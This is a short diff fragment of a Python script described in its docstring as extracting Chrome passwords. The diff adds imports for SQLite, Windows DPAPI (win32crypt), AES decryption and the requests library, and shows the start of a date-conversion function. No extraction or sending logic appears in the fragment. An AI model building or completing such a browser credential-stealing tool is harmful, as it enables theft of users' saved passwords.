@@ -4,6 +4,16 @@ Date: May 2025
 Description: Extracts Chrome Passwords
 """
 
+import os
+import json
+import base64
+import sqlite3
+import win32crypt
+from Cryptodome.Cipher import AES
+import shutil
+from datetime import timezone, datetime, timedelta
+import requests
+
 
 # Password fetching functions
 def chrome_date_and_time(chrome_data):
